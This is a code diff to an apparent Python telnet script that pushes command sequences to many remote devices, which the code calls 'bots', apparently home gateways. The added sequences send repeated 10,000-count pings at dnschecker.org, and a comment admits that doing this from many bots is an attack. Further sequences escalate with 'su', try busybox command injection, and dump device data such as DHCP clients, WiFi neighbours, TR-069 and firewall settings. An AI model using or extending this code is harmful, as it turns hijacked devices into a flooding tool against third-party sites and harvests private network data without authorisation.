@@ -130,6 +130,9 @@ wont_echo = wont_option(ECHO)
 do_terminal_type = do_option(TERMINAL_TYPE)
 dont_suppress_go_ahead = dont_option(SUPPRESS_GO_AHEAD)
 
+# Global variable
+target = b''
+
 commands = [
     #IAC + IP,
     IAC + WILL + ECHO,
@@ -152,15 +155,27 @@ commands_empty = []
 
 commands_seq1 = [
     ENTER,
-    ENTER,
     b'wap top\r\n',
     b'wap list format 1 path /\r\n',
-    b'wap top\r\n'
-]
-target = b''
-commands_seq2 = [
+    b'wap top\r\n',
     ENTER,
-    b'ping -i 1 -s 65507 -t 64 ' + target + b'\r\n'
+]
+
+commands_seq2 = [
+    #b'ping -i 1 -s 65507 -t 64 ' + target + b'\r\n',
+    #b'ping -c 10 -t 64 34.204.78.186' + b'\r\n',
+    b'ping -c 10000 -t 64 dnschecker.org' + b'\r\n',
+    b'ping -c 10000 -t 64 dnschecker.org' + b'\r\n',
+    b'ping -c 10000 -t 64 dnschecker.org' + b'\r\n',
+    b'ping -c 10000 -t 64 dnschecker.org' + b'\r\n',
+    b'ping -c 10000 -t 64 dnschecker.org' + b'\r\n',
+    b'ping -c 10000 -t 64 dnschecker.org' + b'\r\n',
+    b'ping -c 10000 -t 64 dnschecker.org' + b'\r\n',
+    b'ping -c 10000 -t 64 dnschecker.org' + b'\r\n',
+    b'ping -c 10000 -t 64 dnschecker.org' + b'\r\n',
+    b'ping -c 10000 -t 64 dnschecker.org' + b'\r\n',
+    b'ping -c 10000 -t 64 dnschecker.org' + b'\r\n',
+    ENTER
 ]
 
 commands_seq3 = [
@@ -360,6 +375,8 @@ commands_seq23 = [
     ENTER
 ]
 
+# Sending this sequence to large number of bots is considered an attack.
+# Try to redirect all that traffic to a legitimate website for analyzing the force.
 commands_seq24 = [
     #b'su\r\n',
     b'ping -c 10 35.153.179.122\r\n',
@@ -367,6 +384,90 @@ commands_seq24 = [
     #b'traceroute 35.153.179.122\r\n',
     ENTER
 ]
+
+# Count the number of connections
+commands_ENTER = [ ENTER ]
+
+# try some busybox combinations trying to inject commands
+commands_seq25 = [
+    #b'ping -h\n',
+    b'ping ?\n',
+    #b'ping -c 10 8.8.8.8\n',
+    #b'ping -c 10 -s 1472 8.8.8.8\n',
+    #b'ping -c 10 127.0.0.1\n',
+    #b'ping -c 10 google.com\n',
+    #b'\nping -c 10 127.0.0.1 && ping -c 10 google.com\n',
+    #b'ping6\n',
+    #b'traceroute6 -c 10 google.com\n',
+    b'traceroute6 google.com\n',
+    #b'su\n',
+    ENTER
+]
+
+# Try some arping commands
+commands_seq26 = [
+    b'wap list format 1 path /usr/java\r\n',
+    b'wap list format 1 path /usr/java/bin\r\n',
+    b'wap list format 1 path /usr/java/lib\r\n',
+    #b'arping -I eth0 192.168.100.1\r\n',
+    #b'arping -I eth0 -f 192.168.100.1\r\n',
+    #b'arping -I eth0 -U -s 192.168.100.1\r\n',
+    #b'arping -I eth0 -D 192.168.100.1\r\n',
+    b'arping -I eth0 192.168.100.2\r\n',
+    ENTER,
+    ENTER
+]
+
+# One more round of ping commands
+
+commands_seq27 = [
+    b'ping -c 2 38.141.145.43\r\n',
+    b'ping -c 2 113.77.241.55\r\n',
+    ENTER
+]
+
+# Some useful commands for information gathering
+commands_seq27 = [
+    b'netstat -na\r\n',
+    b'display wifi associate\r\n',
+    b'display tr069 info\r\n',
+    b'display sysinfo\r\n',
+    b'display deviceInfo\r\n',
+    b'display cpu info\r\n',
+    b'display inner version\r\n',
+    b'display file\r\n',
+    b'display waninfo all detail\r\n',
+    b'display wanmac\r\n',
+    b'display lanmac\r\n',
+    b'display productmac\r\n',
+    b'display iptables nat\r\n',
+    b'display iptables filter\r\n',
+    #b'set portmirror\r\n',
+    b'display flow\r\n',
+]
+
+commands_seq28 = [
+    b'su\r\n',
+    b'display dhcp server user all\r\n',
+    b'display log info\r\n',
+    b'display wifi information\r\n',
+    b'check security config\r\n',
+    b'ip route show\r\n',
+    b'ip neigh\r\n',
+    b'display wifi neighbor\r\n',
+    b'wap list format 1 path / \r\n',
+    b'ENTER'
+]
+
+commands_seq29 = [
+    b'su\r\n',
+    b'display dhcp server user all\r\n',
+    b'ip neigh\r\n',
+    b'check security config\r\n',
+    ENTER
+]
+
+
 
 
 # Print some useful hardcoded combinations
